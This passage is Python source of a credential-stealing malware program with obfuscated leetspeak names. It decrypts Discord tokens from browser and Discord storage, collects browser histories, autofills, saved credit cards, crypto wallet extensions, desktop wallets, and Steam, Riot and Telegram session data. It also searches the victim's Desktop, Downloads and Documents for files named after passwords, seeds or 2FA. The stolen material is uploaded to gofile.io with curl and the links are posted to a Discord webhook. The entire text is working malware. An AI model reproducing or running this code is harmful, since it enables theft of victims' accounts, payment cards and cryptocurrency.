                "description": f"<:srcr_newspaper:1187579795056373782> • **{H1570rYC0UNt}** Histories Found\n<:blackarrow:1095740975197995041> • [{cname}Histories.txt]({filess[4]})\n\n<:lol_role_fill:1187747599286018149> • **{AU70F111C0UNt}** Autofills Found\n<:blackarrow:1095740975197995041> • [{cname}Autofills.txt]({filess[3]})\n\n<:1SW_CreditCard:1187580159495245876> • **{CC5C0UNt}** Credit Cards Found\n<:blackarrow:1095740975197995041> • [{cname}CreditCards.txt]({filess[2]})\n\n<:black_book:1187577552739508286> • **{B00KM4rK5C0UNt}** Bookmarks Found\n<:blackarrow:1095740975197995041> • [{cname}Bookmarks.txt]({filess[5]})",
                "color": 2895667,
                "footer": {"text": f"{footerc}",  
                "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}
            }
        ],
        "username": f"{cname} | t.me/{smallcname}r",
        "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
        "attachments": []
    }
    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
    return

def G37D15C0rD(path, arg):
    if not os.path.exists(f"{path}/Local State"): return
    pathC = path + arg
    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        global T0K3Ns
                        tokenDecoded = D3CrYP7V41U3(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        if CH3CK70K3N(tokenDecoded):
                            if not tokenDecoded in T0K3Ns:
                                T0K3Ns += tokenDecoded
                                UP104D70K3N(tokenDecoded, path)

def G47H3rZ1P5(paths1, paths2, paths3):
    thttht = []
    for walletids in w411375:
        
        for patt in paths1:
            a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[5]+str(walletids[0]), patt[1]])
            a.start()
            thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)

    a = threading.Thread(target=Z1P73136r4M, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht:
        thread.join()
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
    wal, ga, ot = "",'',''
    if not len(W411375Z1p) == 0:
        wal = "<:ETH:975438262053257236>  •  Wallets\n"
        for i in W411375Z1p:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(G4M1N6Z1p) == 0:
        ga = "<:blackgengar:1111366900690202624>  •  Gaming:\n"
        for i in G4M1N6Z1p:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(O7H3rZ1p) == 0:
        ot = "<:black_planet:1095740276850569226>  •  Apps\n"
        for i in O7H3rZ1p:
            ot += f"└─ [{i[0]}]({i[1]})\n"
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": GLINFO,
        "embeds": [
            {
            "title": f"{cname} | App {words}",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 2895667,
            "footer": {
                "text": f"{footerc}",
                "icon_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
            }
            }
        ],
        "username": f"{cname} | t.me/{smallcname}r",
        "avatar_url": "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png",
        "attachments": []
    }
    
    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)

def Z1P73136r4M(path, arg, procc):
    global O7H3rZ1p
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    time.sleep(1)
    Z1PF01D3r(name, pathC)

    for i in range(3):
        lnik = UP104D7060F113(f'{temp}/{name}.zip')
        if "https://" in str(lnik):
            break
        time.sleep(4)
    os.remove(f"{temp}/{name}.zip")
    O7H3rZ1p.append([arg, lnik])

def Z1P7H1N65(path, arg, procc):
    pathC = path
    name = arg
    
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
    for walllts in w411375:
        if str(walllts[0]) in arg:
            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
            name = f"{str(walllts[1])}_{browser}"
            pathC = path + arg

    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)
    time.sleep(1)

    if "Wallet" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg

    Z1PF01D3r(name, pathC) 

    for i in range(3):
        lnik = UP104D7060F113(f'{temp}/{name}.zip')
        if "https://" in str(lnik):break
        time.sleep(4)

    os.remove(f"{temp}/{name}.zip")
    if "/Local Extension Settings/" in arg or "/HougaBouga/"  in arg or "wallet" in arg.lower():
        W411375Z1p.append([name, lnik])
    elif "Steam" in name or "RiotCli" in name:
        G4M1N6Z1p.append([name, lnik])
    else:
        O7H3rZ1p.append([name, lnik])

def S74r77Hr34D(meth, args = []):
    a = threading.Thread(target=meth, args=args)
    a.start()
    THr34D1157.append(a)

def G47H3r411():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >                 Password/CC < 3 >     Cookies < 4 >                 Extentions < 5 >                           '
    br0W53rP47H5 = [    
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "/",             "/Network",             "/Local Extension Settings/"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",         "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ]
    ]
    d15C0rDP47H5 = [
        [f"{roaming}/discord",          "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord",        "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary",    "/Local Storage/leveldb"],
        [f"{roaming}/discordptb",       "/Local Storage/leveldb"],
    ]

    p47H570Z1P = [
        [f"{roaming}/atomic/Local Storage/leveldb",                             "Atomic Wallet.exe",        "Wallet"        ],
        [f"{roaming}/Guarda/Local Storage/leveldb",                             "Guarda.exe",               "Wallet"        ],
        [f"{roaming}/Zcash",                                                    "Zcash.exe",                "Wallet"        ],
        [f"{roaming}/Armory",                                                   "Armory.exe",               "Wallet"        ],
        [f"{roaming}/bytecoin",                                                 "bytecoin.exe",             "Wallet"        ],
        [f"{roaming}/Exodus/exodus.wallet",                                     "Exodus.exe",               "Wallet"        ],
        [f"{roaming}/Binance/Local Storage/leveldb",                            "Binance.exe",              "Wallet"        ],
        [f"{roaming}/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb",     "Jaxx.exe",                 "Wallet"        ],
        [f"{roaming}/Electrum/wallets",                                         "Electrum.exe",             "Wallet"        ],
        [f"{roaming}/Coinomi/Coinomi/wallets",                                  "Coinomi.exe",              "Wallet"        ],
        ["C:\Program Files (x86)\Steam\config",                                 "steam.exe",                "Steam"         ],
        [f"{local}/Riot Games/Riot Client/Data",                                "RiotClientServices.exe",   "RiotClient"    ],
    ]
    t3136r4M = [f"{roaming}/Telegram Desktop/tdata", 'Telegram.exe', "Telegram"]


    for patt in br0W53rP47H5:
       S74r77Hr34D(G3770K3N,   [patt[0], patt[2]]                                   )
    for patt in d15C0rDP47H5:
       S74r77Hr34D(G37D15C0rD, [patt[0], patt[1]]                                   )
    S74r77Hr34D(G378r0W53r5,   [br0W53rP47H5,]                                      )
    S74r77Hr34D(G47H3rZ1P5,    [br0W53rP47H5, p47H570Z1P, t3136r4M]                 )
    for thread in THr34D1157:
        thread.join()
    
def UP104D7060F113(path):
    try:
        r = subprocess.Popen(f"curl -F \"file=@{path}\" https://{gofileserver}.gofile.io/uploadFile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
        return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
    except: return False

def K1W1F01D3r(pathF, keywords):
    global K1W1F113s
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = UP104D7060F113(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    K1W1F113s.append(["folder", pathF + "/", ffound])

K1W1F113s = []
def K1W1F113(path, keywords):
    global K1W1F113s
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and os.stat(path + "/" + file).st_size < 500000 and not ".lnk" in file:
                    fifound.append([path + "/" + file, UP104D7060F113(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    K1W1F01D3r(target, keywords)
                    break

    K1W1F113s.append(["folder", path, fifound])

def K1W1():
    user = temp.split("\AppData")[0]
    path2search = [
        user    + "/Desktop",
        user    + "/Downloads",
        user    + "/Documents",
        roaming + "/Microsoft/Windows/Recent",
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "bot",
        "atomic",
        "account",
        "acount",
        "paypal",
        "banque",
        "bot",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "seed",
        "mnemonic"
        "memoric",
        "private",
        "key",
        "passphrase",
        "pass",
        "phrase",
        "steal",
        "bank",
        "info",
        "casino",
        "prv",
        "privé",
        "prive",
        "telegram",
        "identifiant",
        "personnel",
        "trading"
        "bitcoin",
        "sauvegarde",
        "funds",
        "récupé",
        "recup",
        "note",
    ]
   
    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=K1W1F113, args=[patt, key_wordsFiles])
        kiwi.start()
        wikith.append(kiwi)
    return wikith

def filestealr():
    wikith = K1W1()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in K1W1F113s:
        if len(arg[2]) != 0:
            foldpath = arg[1].replace("\\", "/")
            foldlist = arg[2]
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─<:openfolder:1111408286332375040> [{fileanme}]({b})\n"
            filetext += "\n"
    UP104D("kiwi", filetext)

global k3YW0rd, c00K1W0rDs, p45WW0rDs, C00K1C0UNt, P455WC0UNt, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157

DETECTED = False
w411375 = [
    ["nkbihfbeogaeaoehlefnkodbefgpgknn", "Metamask"         ],
    ["ejbalbakoplchlghecdalmeeeajnimhm", "Metamask"         ],
    ["fhbohimaelbohpjbbldcngcnapndodjp", "Binance"          ],
    ["hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase"         ],
    ["fnjhmkhhmkbjkkabndcnnogagogbneec", "Ronin"            ],
    ["egjidjbpglichdcondbcbdnbeeppgdph", "Trust"            ],
    ["ojggmchlghnjlapmfbnjholfjkiidbch", "Venom"            ],
    ["opcgpfmipidbgpenhmajoajpbobppdil", "Sui"              ],
    ["efbglgofoippbgcjepnhiblaibcnclgk", "Martian"          ],
    ["ibnejdfjmmkpcnlpebklmnkoeoihofec", "Tron"             ],
    ["ejjladinnckdgjemekebdpeokbikhfci", "Petra"            ],
    ["phkbamefinggmakgklpkljjmgibohnba", "Pontem"           ],
    ["ebfidpplhabeedpnhjnobghokpiioolj", "Fewcha"           ],
    ["afbcbjpbpfadlkmhmclhkeeodmamcflc", "Math"             ],
    ["aeachknmefphepccionboohckonoeemg", "Coin98"           ],
    ["bhghoamapcdpbohphigoooaddinpkbai", "Authenticator"    ],
    ["aholpfdialjgjfhomihkjbmgjidlcdno", "ExodusWeb3"       ],
    ["bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"          ],
    ["agoakfejjabomempkjlepdflaleeobhb", "Core"             ],
    ["mfgccjchihfkkindfppnaooecgfneiii", "Tokenpocket"      ],
    ["lgmpcpglpngdoalbgeoldeajfclnhafa", "Safepal"          ],
    ["bhhhlbepdkbapadjdnnojkbgioiodbic", "Solfare"          ],
    ["jblndlipeogpafnldhgmapagcccfchpi", "Kaikas"           ],
    ["kncchdigobghenbbaddojjnnaogfppfj", "iWallet"          ],
    ["ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi"            ],
    ["hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"           ],
    ["cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx Liberty"     ],
    ["amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"           ],
    ["fhilaheimglignddkjgofkcbgekhenbh", "Oxygen"           ],
    ["nlbmnnijcnlegkjjpcfjclmcfggfefdm", "MEWCX"            ],
    ["nanjmdknhkinifnkgdcggcfnhdaammmj", "Guild"            ],
    ["nkddgncdjgjfcddamfgcmfnlhccnimig", "Saturn"           ], 
    ["aiifbnbfobpmeekipheeijimdpnlpgpp", "TerraStation"     ],
    ["fnnegphlobjdpkhecapkijjdkgcjhkib", "HarmonyOutdated"  ],
    ["cgeeodpfagjceefieflmdfphplkenlfk", "Ever"             ],
    ["pdadjkfkgcafgbceimcpbkalnfnepbnk", "KardiaChain"      ],
    ["mgffkfbidihjpoaomajlbgchddlicgpn", "PaliWallet"       ],
    ["aodkkagnadcbobfpggfnjeongemjbjca", "BoltX"            ],
    ["kpfopkelmapcoipemfendmdcghnegimn", "Liquality"        ],
    ["hmeobnfnfcmdkdcmlblgagmfpfboieaf", "XDEFI"            ],
    ["lpfcbjknijpeeillifnkikgncikgfhdo", "Nami"             ],
    ["dngmlblcodfobpdpecaadgfbcggfjfnm", "MaiarDEFI"        ],
    ["ookjlbkiijinhpmnjffcofjonbfbgaoc", "TempleTezos"      ],
    ["eigblbgjknlfbajkfhopmcojidlgcehm", "XMR.PT"           ],
]
IP = G371P()
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

k3YW0rd = ['[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[github](https://github.com)', '[stake](https://stake.com)']
C00K1C0UNt, P455WC0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt = 0, 0, 0, 0, 0, 0
c00K1W0rDs, p45WW0rDs, H1570rY, CCs, P455w, AU70F11l, C00K13s, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157, K1W1F113s, B00KM4rK5, T0K3Ns = [], [], [], [], [], [], [], [], [], [], [], [], [], ''

try:gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
except:gofileserver = "store4"
GLINFO = G108411NF0()


G47H3r411()
wikith = K1W1()

for thread in wikith: thread.join()
time.sleep(0.2)

filetext = "\n"
for arg in K1W1F113s:
    if len(arg[2]) != 0:
        foldpath = arg[1]
        foldlist = arg[2]       
        filetext += f"<:openfolder:1111408286332375040> {foldpath}\n"

        for ffil in foldlist:
            a = ffil[0].split("/")
            fileanme = a[len(a)-1]
            b = ffil[1]
            filetext += f"└─<:openfolder:1111408286332375040> [{fileanme}]({b})\n"
        filetext += "\n"
UP104D("kiwi", filetext)
